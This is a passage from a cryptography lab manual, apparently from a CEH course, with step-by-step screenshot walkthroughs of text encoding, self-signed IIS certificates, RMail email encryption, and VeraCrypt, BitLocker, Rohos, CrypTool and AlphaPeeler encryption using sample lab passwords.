Select the data that you want to encode and paste it to the clipboard by pressing Ctrl+V.

Ensure that the password option is selected in the Encode by field and click Encode.

ilpt41x4.jpg

The Enter password pop-up appears; enter the password into the Password field and retype it in the Confirm field; then, click OK. (Here, we use the password test@123).

Screenshot

BCTextEncoder encodes the text and displays it in under the Encoded text section, as shown in the screenshot.

14up53ih.jpg

To decrypt the data, first, you need to clean the Decoded plain text in the clipboard, and then click the Decode button.

3bez23eu.jpg

The Enter password for encoding text dialog-box appears; insert the Password (test@123) into the password field and click OK.

Screenshot

The decoded plain text appears under the Decoded plain text section, as shown in the screenshot.

edub4ny1.jpg

In real-time, using this procedure, you can encode the text while sending it to the intended user along with the password used for encryption. The user for whom the text is intended should have the BCTextEncoder application installed on his/her machine. He/she will have to paste the encoded text into the Encoded text section and use the password you shared, to decode it to plain text.

This concludes the demonstration of encrypting and decrypting the data using BCTextEncoder.

You can also use other cryptography tools such as AxCrypt (https://www.axcrypt.net), Microsoft Cryptography Tools (https://docs.microsoft.com), and Concealer (https://www.belightsoft.com) to encrypt confidential data.

Close all open windows and document all the acquired information.

########
Lab 2: Create a Self-signed Certificate
########

========
Task 1: Create and Use Self-signed Certificates
========

Here, we will create a self-signed certificate in Windows Server 2019.

Click on Windows Server 2019 to switch to the Windows Server 2019, click Ctrl+Alt+Delete to activate the machine. By default, Administrator profile is selected, type Pa$$w0rd to enter password in the Password field and press Enter to login.

Screenshot

Before you start this task, you will need to check with your local sites whether they include a self-signed certificate.

Launch any web browser (here, Google Chrome), place the cursor in the address bar and type https://www.goodshopping.com, and press Enter.

As you are using an https channel to browse the website, it displays a page stating that This site can’t be reached.

As the site does not have a self-signed certificate, it displays a connection refused message, as shown in the screenshot. Close the web browser.

Screenshot

Click the Type here to search icon present in the bottom-left of Desktop and type iis. Select Internet Information Services (IIS) Manager from the results.

Screenshot

The Internet Information Services (IIS) Manager window appears; click the machine name (SERVER2019 (SERVER2019\Administrator)) under the Connections section from the left-hand pane.

In SERVER2019 Home, double-click Server Certificates in the IIS section.

sdc4ouhe.jpg

The Server Certificates wizard appears; click Create Self-Signed Certificate… from the right-hand pane in the Actions section.

33.jpg

The Create Self-Signed Certificate window appears; type GoodShopping in the Specify a friendly name for the certificate field. Ensure that the Personal option is selected in the Select a certificate store for the new certificate field; then, click OK.

Screenshot

A newly created self-signed certificate will be displayed in the Server Certificates pane, as shown in the screenshot.

Screenshot

Expand the Sites node from the left-hand pane, and select GoodShopping from the available sites. Click Bindings… from the right-hand pane in the Actions section.

44.jpg

The Site Bindings window appears; click Add….

Screenshot

The Add Site Binding window appears; choose https from the Type field drop-down list. Once you choose the https type, the port number in the Port field automatically changes to 443 (the channel on which HTTPS runs).

Choose the IP address on which the site is hosted (here, 10.10.1.19).

Under the Host name field, type www.goodshopping.com. Under the SSL certificate field, select GoodShopping from the drop-down list, and click OK.

Screenshot

The newly created SSL certificate is added to the Site Bindings window; then, click Close.

Screenshot

Now, right-click the name of the site for which you have created the self-signed certificate (here, GoodShopping) and click Refresh from the context menu.

Screenshot

Minimize the Internet Information Services (IIS) Manager window.

Open the Google Chrome browser place the cursor in the address bar and type https://www.goodshopping.com, and press Enter.

The Your connection is not private message appears, click ADVANCED to proceed.

Screenshot

Click Proceed to www.goodshopping.com (unsafe).

Screenshot

Now you can see Goodshopping webpage with ssl certificate assigned to it, as shown in the screenshot.

Screenshot

This concludes the demonstration of creating and using a self-signed certificate.

Close all open windows and document all the acquired information.

########
Lab 3: Perform Email Encryption
########

========
Task 1: Perform Email Encryption using RMail
========

Here, we will use the RMail tool to perform email encryption.

Click Windows 11 to switch to the Windows 11 machine.

Launch any web browser (here, Mozilla Firefox), Place the cursor in the address bar and click https://www.rmail.com/free-trial/, and press Enter.

The RMail FREE TRIAL webpage appears, click on Apps from the menu to navigate to the Apps page.

ttl5b5px.jpg

In the Get Started with Rmail. Select an App page scroll down and select RMail Online.

ycrred0t.jpg

The Rmail Online for Desktop & Mobile Browsers window appears, scroll down and click on CLICK HERE TO GET STARTED.

hrvhlndg.jpg

The RMail webpage appears, click on CREATE AN ACCOUNT.

2ssmiiq5.jpg

Let's get started! page appears, as well as the registration form. Fill in the required personal details and click on Sign up.

3ukg25p2.jpg

Final step! page appears displaying that the activation link has been sent to the registered email address.

Screenshot

Now, open a new tab in the browser and open the Gmail account which you have used to create the RMail account.

Open the email from support@rpost.com and click the activation link to activate the account.

1ocy02bsq.jpg

support.rpost.com page appears, scroll down and click on https://app.rmail.com/ link.

kfhwbzsu.jpg

The app.rmail.com page appears, click on LOGIN at the top right corner of the web page.

k3z04eix.jpg

In the Welcome back! page, enter the email address and password that was used during registration and click on Sign in.

fj1gculk.jpg

The RMail Online page appears, in the To field enter the recipient address. Ensure that Marked as is selected under Track & Prove section in the right-pane. Check the Encrypt - select primary receiving experience option and ensure that the Transmission-auto-decrypts for receiver radio button is selected. Ensure that E-Sign - send for signature check-box is checked, and Web Sign radio button is selected.

fprlrleo.jpg

After selecting the options, enter a message to be sent to the recipient, and click on SEND REGISTERED button.

cilmd2wb.jpg

Upon clicking SEND REGISTERED button, Email Sent pop-up appears.

Now, navigate to the tab in which Gmail account that was opened previously, you can observe an Acknowledgement email with Proof of Sending.

05hjzrwf.jpg

In this task, for the purpose of demonstration, we will open the recipient’s account and view the email.

To do so, click on Windows Server 2019 to switch to the Windows Server 2019, click Ctrl+Alt+Delete to activate the machine. By default, Administrator profile is selected, click on Pa$$w0rd to enter password in the password field and press Enter to login.

Screenshot

Open any web browser (here, Mozilla Firefox) and log in to the Gmail account of the recipient. Open the email from the sender.

You can observe that the email received is tagged as a registered email wherein a document has been sent for the recipient to review and electronically sign to confirm his/her identity.

You might receive an email in the spam folder.

Click the View & Sign Document button to sign an agreement.

1nbriaprg.jpg

A new E-Sign webpage appears displaying the email content; click CONTINUE.

tvu0jxq4.jpg

The Instructions: How To E-Sign page appears; read the instructions carefully and click CONTINUE.

be020gtk.jpg

After viewing the email content, click NEXT.

dgbgjv5w.jpg

The Final Step - Please Complete the Information Below page appears with the Document Signature form. In the Please enter your name field, enter your name (Recipient’s name) and leave the Initials and Title field as blank and click the Click to Sign button.

gwcqhjve.jpg

The YOU’RE ALL DONE! page appears; close the current tab to return to the opened email. Click Inbox from the left-hand pane to navigate to the inbox.

Open an email from RPost eSignOff Service. You can observe that it is an acknowledgment email from RPost along with various details such as Signed By, Date, Time, Original Recipient, IP, Message Id, etc.

i0yzo1d0.jpg

Now, click on Windows 11 to return to the Windows 11 machine, where the sender’s account is opened. In Inbox, you can observe two emails (Receipt and RPost eSignOff Service). Click to open the Receipt email.

You might receive a Receipt mail in the RMail Receipts inbox folder present in the left-hand pane.

The Receipt email contains information about the Delivery Status, Message Envelope, and Message Statistics of the sent email, as shown in the screenshot.

The Receipt email also includes the DeliveryReceipt and HtmlReceipt attachments containing detailed information regarding the sent email.

gg0hv3rl.jpg

Now, navigate back to the Inbox and open an email from RPost eSignOff Service. This email contains the same information as the email received from RPost eSignOff Service by the recipient.

This concludes the demonstration of performing email encryption using RMail.

You can also use other email encryption tools such as Virtru (https://www.virtru.com), ZixMail (https://www.zixcorp.com), Egress Secure Email and File Transfer (https://www.egress.com), and Proofpoint Email Protection (https://www.proofpoint.com) to perform email encryption.

Close all open windows and document all the acquired information.

########
Lab 4: Perform Disk Encryption
########

========
Task 1: Perform Disk Encryption using VeraCrypt
========

VeraCrypt is a software used for establishing and maintaining an on-the-fly-encrypted volume (data storage device). On-the-fly encryption means that data is automatically encrypted just before it is saved, and decrypted just after it is loaded, without any user intervention. No data stored on an encrypted volume can be read (decrypted) without using the correct password/keyfile(s) or correct encryption keys. The entire file system is encrypted (e.g., file names, folder names, free space, metadata, etc.).

Here, we will use the VeraCrypt tool to perform disk encryption.

Click Windows 11 to switch to the Windows 11 machine.

Click Search icon ( search1Icon.jpg) on the Desktop. Type vera in the search field, the VeraCrypt appears in the results, click Open to launch it.

Screenshot

The VeraCrypt main window appears; click the Create Volume button.

Screenshot

The VeraCrypt Volume Creation Wizard window appears. Ensure that the Create an encrypted file container radio-button is selected and click Next to proceed.

Screenshot

In the Volume Type wizard, keep the default settings and click Next.

In the Volume Location wizard, click Select File….

Screenshot

The Specify Path and File Name window appears; navigate to the desired location (here, Desktop), provide the File name as MyVolume, and click Save.

Screenshot

After saving the file, the location of a file containing the VeraCrypt volume appears under the Volume Location field; then, click Next.

Screenshot

In the Encryption Options wizard, keep the default settings and click Next.

In the Volume Size wizard, ensure that the MB radio-button is selected and specify the size of the VeraCrypt container as 5; then, click Next.

Screenshot

The Volume Password wizard appears; provide a strong password in the Password field, retype in the Confirm field, and click Next. The password provided in this lab is qwerty@123.

Screenshot

A VeraCrypt Volume Creation Wizard warning pop-up appears; then, click Yes.

The Volume Format wizard appears; ensure that FAT is selected in the Filesystem option and Default is selected in Cluster option.

Check the checkbox under the Random Pool, Header Key, and Master Key section.

Move your mouse as randomly as possible within the Volume Creation Wizard window for at least 30 seconds and click the Format button.

Screenshot

After clicking Format, VeraCrypt will create a file called MyVolume in the provided folder. This file depends on the VeraCrypt container (it will contain the encrypted VeraCrypt volume).

Depending on the size of the volume, volume creation may take some time.

Once the volume is created, a VeraCrypt Volume Creation Wizard dialog-box appears; click OK.

Screenshot

In the VeraCrypt Volume Creation Wizard window, a Volume Created message appears; then, click Exit.

Screenshot

The VeraCrypt main window appears; select a drive (here, I:) and click Select File….

Screenshot

The Select a VeraCrypt Volume window appears; navigate to Desktop, click MyVolume, and click Open.

Screenshot

The window closes, and the VeraCrypt window appears displaying the location of selected volume under the Volume field; then, click Mount.

Screenshot

The Enter password dialog-box appears; type the password you specified in Step#11 into the Password field and click OK.

The password specified in this task is qwerty@123.

Screenshot

After the password is verified, VeraCrypt will mount the volume in I: drive, as shown in the screenshot:

Screenshot

MyVolume has successfully mounted the container as a virtual disk (I:). The virtual disk is entirely encrypted (including file names, allocation tables, free space, etc.) and behaves similarly to a real disk. You can copy or move files to this virtual disk to encrypt them.

Create a text file on Desktop and name it Test. Open the text file and insert text.

Click File in the menu bar and click Save.

Screenshot

Copy the file from Desktop and paste it into Local Disk (I:). Close the window.

Screenshot

Switch to the VeraCrypt window, click Dismount, and then click Exit.

Screenshot

The I: drive located in This PC disappears.

This lab is used to demonstrate that, in cases of system hacks, if an attacker manages to gain remote access or complete access to the machine, he/she will not be able to find the encrypted volume—including its files—unless he/she is able to obtain the password. Thus, all sensitive information located on the encrypted volume is safeguarded.

This concludes the demonstration of performing disk encryption using VeraCrypt.

Close all open windows and document all the acquired information.

========
Task 2: Perform Disk Encryption using BitLocker Drive Encryption
========

Here, we will perform disk encryption using BitLocker Drive Encryption.

Click Search icon ( search1Icon.jpg) on the Desktop. Type manage in the search field, the Manage Bitlocker appears in the results, click Open to launch it.

Screenshot

The BitLocker Drive Encryption window appears; click the New Volume (E:) BitLocker off option under the Fixed data drives section.

Screenshot

Click the Turn on BitLocker option under New Volume (E:) BitLocker off.

Screenshot

The BitLocker Drive Encryption (E:) wizard appears; check the Use a password to unlock the drive checkbox.

Type the password in the Enter your password field and re-type the password in the Reenter your password field; then, click Next (Here, the password entered is test@123).

Screenshot

The How do you want to back up your recovery key? step appears; click Save to a file from the available options.

Screenshot

The Save BitLocker recovery key as window appears; keep the save location set to This PC --> Documents and click Save.

Click Next in the How do you want to back up your recovery key? step.

In the Choose how much of your drive to encrypt step, select the Encrypt entire drive (slower but best for PCs and drives already in use) button, and click Next.

Screenshot

In the Choose which encryption mode to use step, ensure that the Compatible mode (best for drives that can be moved from this device) option is selected, and click Next.

Screenshot

In the Are you ready to encrypt this drive? step, click Start encrypting to encrypt the selected drive.

Screenshot

The BitLocker Drive Encryption pop-up appears, showing the Encrypting… status.

Screenshot

After the completion of the encryption process, the Encryption of E: is complete notification appears; click Close and Restart the machine.

Screenshot

After the system reboots, click Ctrl+Alt+Delete to activate it. By default, Admin user profile is selected, type Pa$$w0rd in the Password field and press Enter to login

Screenshot

Open File Explorer and click This PC from the left pane.

You can observe that Local Disk (E:) is now encrypted; double-click and the Local Disk (E:) security pop-up appears at the top-right corner of Desktop

Type the password you provided in Step#5 and click Unlock.

Here, the password is test@123.

Screenshot

If the Local Disk (E:) pop-up appears at the top-right corner of the window. Click the Open folder to view files option to view the disk content.

The New Volume (E:) window appears displaying the disk content, as shown in the screenshot.

The disk will remain unlocked until the next time you restart the system.

Screenshot

This concludes the demonstration of performing disk encryption using BitLocker Drive Encryption.

Once, you are done with this task; you must turn off BitLocker to decrypt the New Volume (E:) disk.

To do so, open the BitLocker Drive Encryption window, click New Volume (E:) BitLocker on and from the options click Turn off BitLocker.

Screenshot

The BitLocker Drive Encryption pop-up appears; click Turn off BitLocker.

Screenshot

BitLocker initiates the decryption process. Wait for it to complete.

Screenshot

If after the completion of decryption process, the Decryption of E: is complete pop-up appears; click Close.

The New Volume (E:) decrypts successfully.

Close all open windows and document all the acquired information.

========
Task 3: Perform Disk Encryption using Rohos Disk Encryption
========

Rohos Disk Encryption creates hidden and password-protected partitions on a computer or USB flash drive, and password protects/locks access to your Internet applications. It uses a NIST-approved AES encryption algorithm with a 256-bit encryption key length. Encryption is automatic and on-the-fly.

Here, we will use the Rohos Disk Encryption tool to perform disk encryption.

In the Windows 11 machine, navigate to E:\CEH-Tools\CEHv12 Module 20 Cryptography\Disk Encryption Tools\Rohos Disk Encryption and double-click rohos.exe.

If a User Account Control pop-up appears, click Yes.

The Select Setup Language dialog box appears; click OK.

The Setup - Rohos Disk Encryption window appears; read the instruction and click Next.

Follow the steps and install the application using all default settings.

After the completion of the installation, Completing the Rohos Disk Encryption Setup wizard appears; ensure that the Launch Rohos Disk checkbox is checked and click Finish.

If User Account Control pop-up appears, click Yes.

gft3rsiu.jpg

The Rohos Disk Encryption main window appears; click Create new disk…

udhpnxki.jpg

The Create new Rohos disk window appears; click Change… to modify the size of the encrypted disk.

pwlkzoe1.jpg

The Disk details wizard appears; modify the disk size to 10 in the Disk Size (in Megabytes) field and leave all other settings to default; then, click OK.

Screenshot

Provide a password in the Specify a new password to access the disk field and retype it into the Confirm password field; then, click Create disk button (Here, the password provided is test@123).

Screenshot

Wait until the encrypted volume is created. The time to create the encrypted volume depends upon the size you specified under the Disk Size option: if large, it will take a long time to create the volume.

On creating the encrypted volume, the Encrypted Disk (R:) window appears, displaying the default disk content, as shown in the screenshot.

Screenshot

The Disk is connected notification appears at the top section of the Rohos Disk Encryption window.

This drive appears only when you are connected to Rohos Disk Encryption, and disappears when you exit.

xqunbv3x.jpg

If you wish to conceal any important files/directories from anyone accessing your system, you can place them in this drive and access them whenever required (by launching Rohos and entering the password).

Now, we shall place a text file in Encrypted disk (R:). To do so, create a text file on Desktop and name it Test. Open the file and insert text.

Click File in the menu bar and click Save.

Screenshot

Copy the file from Desktop and paste into Encrypted Disk (R:). Close the window.

Screenshot

Switch to the Rohos Disk Encryption window and click Disconnect to dismount Encrypted disk (R:).

54xtnrcx.jpg

A notification appears stating Primary Rohos disk is not connected at the top of the Rohos Disk Encryption window. To mount the disk again, click the Connect disk option.

aa.jpg

The Rohos pop-up appears; type the password you provided in Step#6 into the Enter password to access Rohos disk field and click OK.

Here, the password is test@123.

Screenshot

The Disk is connected notification appears in the Rohos Disk Encryption window. Click Browse to explore the disk content.

40vnobbn.jpg

The Encrypted Disk (R:) window appears; you can see the Test.txt file that was pasted onto the disk earlier, as shown in the screenshot.

Screenshot

You can access the disk content and further add, delete, and modify the files. After making the intended changes, click Disconnect again in the Rohos Disk Encryption window to dismount the disk.

54xtnrcx.jpg

You can also use the Encrypt USB drive option to share sensible information with someone via USB. You can use this application to store the files in an encrypted disk and share the password with that person. The person with whom you want to share the files can access them only after entering the correct password. This way, you can protect the files from being viewed by a third person and thereby safeguard them.

This concludes the demonstration of performing disk encryption using Rohos Disk Encryption.

You can also use other disk encryption tools such as FinalCrypt (http://www.finalcrypt.org), Seqrite Encryption Manager (https://www.seqrite.com), FileVault (https://support.apple.com), and Gillsoft Full Disk Encryption (http://www.gilisoft.com) to perform disk encryption.

Close all open windows and document all the acquired information

########
Lab 5: Perform Cryptanalysis using Various Cryptanalysis Tools
########

========
Task 1: Perform Cryptanalysis using CrypTool
========

Here, we will use the CrypTool tool to perform cryptanalysis.

Click Search icon ( search1Icon.jpg) on the Desktop. Type cryp in the search field, the CrypTool appears in the results, click Open to launch it.

If a User Account Control pop-up appears, click Yes.

Screenshot

The CrypTool main window appears with a How to Start window. Check the Don’t show this dialog again checkbox and click Close.

Screenshot

The CrypTool window appears; close the startingexample-en.txt window.

Screenshot

Click the File option from the menu bar and select New to create encrypted data.

Screenshot

The Unnamed1 notepad appears; insert some text into the file. You will be encrypting this content.

From the menu bar, click Encrypt/Decrypt and navigate to Symmetric (modern) --> RC2….

RC2 is a symmetric-key block cipher. It is a 64-bit block cipher with variable key size and uses 18 rounds.

Screenshot

The Key Entry: RC2 dialog box appears; keep the Key length set to default (8 bits).

In the text field below Key length, enter 05 as hexadecimal characters, and click Encrypt.

The chosen hexadecimal character acts as a key that you must send to the intended user along with the encrypted file.

Screenshot

The RC encryption of Unnamed1 notepad file appears, as shown in the screenshot.

Screenshot

To save, click File in the menu bar and select Save.

Screenshot

The Save As window appears; choose the save location (here, Desktop) and click Save.

The file name may differ when you perform the task.

Screenshot

Now, you can send this file to the intended person by email or any other means and provide him/her with the hex value, which will be used to decrypt the file.

To share the file, you may copy the encrypted file (Cry-RC2-Unnamed1.hex) from Desktop to E:\CEH-Tools\CEHv12 Module 20 Cryptography\Cryptanalysis Tools\CrypTool.

Screenshot

Assume that you are the intended recipient (working on Windows Server 2019) of the encrypted file through the shared network drive and the key to open the encrypted data was sent to you via an email. Using this, you can decrypt the encrypted data and see the data in plain-text.

Click on Windows Server 2019 to switch to the Windows Server 2019, click Ctrl+Alt+Delete to activate the machine. By default, Administrator profile is selected, type * Pa$$w0rd* to enter password in the password field and press Enter to login.

Screenshot

Navigate to Z:\CEHv12 Module 20 Cryptography\Cryptanalysis Tools\CrypTool, copy the Cry-RC2-Unnamed1.hex and paste it in the Desktop.

Screenshot

Click Type here to search icon on the Desktop. Type cryp in the search field, the CrypTool appears in the results, click on CrypTool to launch it.

Screenshot

In the CrypTool window; click File in the menu bar and select Open…

If a How to Start window. Check the Don’t show this dialog again checkbox and click Close.

Close the startingexample-en.txt window.

Screenshot

The Open window appears; select All files(*.*) from the drop-down list in the file type option, navigate to the location of the file (here, Desktop), select, and then click Open.

Screenshot

From the menu bar, click Encrypt/Decrypt and navigate to Symmetric (modern) --> RC2…

Screenshot

The Key Entry: RC2 dialog box appears; leave the Key length set to default (8 bits).

In the text field below Key length, enter 05 as hexadecimal characters, and click Decrypt.

Screenshot

The decrypted text appears, as shown in the screenshot:

Screenshot

Now, we shall encrypt the data using Triple DES encryption.

Click Windows 11 to switch back to the Windows 11 machine.

In the CrypTool window, close Cry-RC2-Unnamed1.hex window. Leave the Unnamed1 notepad window open.

From the menu bar, click Encrypt/Decrypt and navigate to Symmetric (modern) --> Triple DES (ECB)…

Screenshot

The Key Entry: Triple DES (ECB) dialog-box appears; leave the Key length set to default (128 bits (effectively 112 bits)).

In the text field below Key length, enter the combinations of 12 as hexadecimal characters, and click Encrypt.

The chosen hexadecimal characters act like a key that you must send to the intended user along with the encrypted file.

Screenshot

The Triple DES (ECB) encryption of Unnamed1 notepad appears, as shown in the screenshot.

Screenshot

To save the file, click File in the menu bar and select Save.

The Save As window appears; choose the save location (here, Desktop) and click Save.

The file name may differ in your lab environment.

Screenshot

To share the file, you may copy the encrypted file (Cry-Triple-Unnamed1.hex) from Desktop to E:\CEH-Tools\CEHv12 Module 20 Cryptography\Cryptanalysis Tools\CrypTool.

Screenshot

Click Windows Server 2019 to switch to Windows Server 2019; copy the encrypted hex file (Cry-Triple-Unnamed1.hex) from Z:\CEHv12 Module 20 Cryptography\Cryptanalysis Tools\CrypTool and paste on Desktop.

Screenshot

Switch to the CrypTool window to decrypt the data; click File in the menu bar and select Open…

Screenshot

The Open window appears; select All files(*.*) from the drop-down list in the file type option, navigate to the location of the file (here, Desktop), select, and click Open.

Screenshot

From the menu bar, click Encrypt/Decrypt and navigate to Symmetric (modern) -- > Triple DES (ECB)…

Screenshot

The Key Entry: Triple DES (ECB) dialog-box appears; keep the Key length set to default (128 bits (effectively 112 bits)).

In the text field below Key length, enter the combinations of 12 as hexadecimal characters and click Decrypt.

Screenshot

The decrypted text appears, as shown in the screenshot.

Screenshot

Using this method, files can be encrypted using CrypTool and shared with an individual in a secure manner, so that no one can intercept the data.

This concludes the demonstration of performing cryptanalysis using CrypTool.

Close all open windows and document all the acquired information.

========
Task 2: Perform Cryptanalysis using AlphaPeeler
========

AlphaPeeler is a powerful tool for learning cryptology. It can be useful as an instructor’s teaching aid and to create assignments for classical cryptography. You can easily learn classical techniques such as frequency analysis of alphabets, mono-alphabetic substitution, Caesar cipher, transposition cipher, Vigenere cipher, and Playfair cipher. AlphaPeeler Professional (powered by crypto++ library) also includes DES, Gzip/Gunzip, MD5, SHA-1, SHA-256, RIPEMD-16, RSA key generation, RSA crypto, RSA signature & validation, and generation of secret share files.

Here, we will use the AlphaPeeler tool to perform cryptanalysis.

Click on Windows 11 to switch to the Windows 11 machine, Click Search icon ( search1Icon.jpg) on the Desktop. Type alpha in the search field, the AlphaPeeler appears in the results, click Open to launch it.

Screenshot

If an Open File - Security Warning pop-up appears, click Run.

AlphaPeeler Professional initializes and the AlphaPeeler main window appears, as shown in the screenshot.

Screenshot

Now, minimize the AlphaPeeler window and create a text file on Desktop. Name it Test, open the file, and insert some text.

Click File in the menu bar and click Save.

Screenshot

Switch back to the AlphaPeeler window; click Professional Crypto from the menu bar and select DES crypto from the options.

Screenshot

The DES crypto pop-up appears; click the ellipsis icon under the Plain text file option.

22.jpg

The Open window appears; navigate to Desktop and select Test.txt file; then, click Open.

Here, we are selecting the file that we will encrypt and this will act as an input file.

Screenshot

In the DES crypto pop-up; click the ellipsis icon under the Cipher text file option.

The Open window appears; select the save location (here, E:\CEH-Tools\CEHv12 Module 20 Cryptography\Cryptanalysis Tools\AlphaPeeler) and name the file as Confidential.txt; then, click Open.

Screenshot

In the DES crypto pop-up; insert the password into the Pass phrase field and click DES-EDE (CBC) button under Encrypt option to encrypt the text file.

Here, the password provided is test@123.

Screenshot

A new file Confidential.txt appears at location E:\CEH-Tools\CEHv12 Module 20 Cryptography\Cryptanalysis Tools\AlphaPeeler, as shown in the screenshot.

Screenshot

Double-click Confidential.txt to open, and you can observe that the file’s content is encrypted.

Here, the encrypted file is shared through shared network drive E:\CEH-Tools\ CEHv12 Module 20 Cryptography and the key to open the encrypted data was sent to you via an email. Using this, you can decrypt the encrypted data and view the data in plain-text.

Screenshot

Close the DES crypto pop-up and the AlphaPeeler window.

Click on Windows Server 2019 to switch to Windows Server 2019; Click Search icon ( search1Icon.jpg) on the Desktop. Type alpha in the search field, the AlphaPeeler appears in the results, double click to launch it.

If an Open File - Security Warning pop-up appears, click Run.

Screenshot

The AlphaPeeler main window appears; click File from the menu bar and click Open…

Screenshot

The Open window appears; in the Look in field, navigate to the location of Z:\CEHv12 Module 20 Cryptography\Cryptanalysis Tools\AlphaPeeler and select Confidential.txt file; then, click Open.

Screenshot

The Confidential.txt file appears; click Professional crypto from the menu bar and select the DES crypto option.

Screenshot

The DES crypto pop-up appears; click the ellipsis icon next to the Plain text file option.

Screenshot

The Open window appears; navigate to Desktop and name the file Result.txt; then, click Open.

Here, we are creating an output file that will be in plain-text.

In the DES crypto pop-up; click the ellipsis icon under the Cipher text file option.

The Open window appears; select the encrypted file (Confidential.txt) located at Z:\CEHv12 Module 20 Cryptography\Cryptanalysis Tools\AlphaPeeler and click Open.

Screenshot

In the DES crypto pop-up, enter the password that you provided in Step#10 into the Pass phrase field and click the DES-EDE (CBC) button next to Decrypt to decrypt the text file.

Here, the password provided is test@123.

Screenshot

Navigate to Desktop and double click the Result.txt file. You can observe the file content in plain-text, as shown in the screenshot.

Screenshot

This concludes the demonstration of performing cryptanalysis using AlphaPeeler.

You can also use other cryptanalysis tools such as Cryptosense (https://cryptosense.com), RsaCtfTool (https://github.com), Msieve (https://sourceforge.net), and Cryptol (https://cryptol.net) to perform cryptanalysis.

Close all open windows and document all the acquired information.

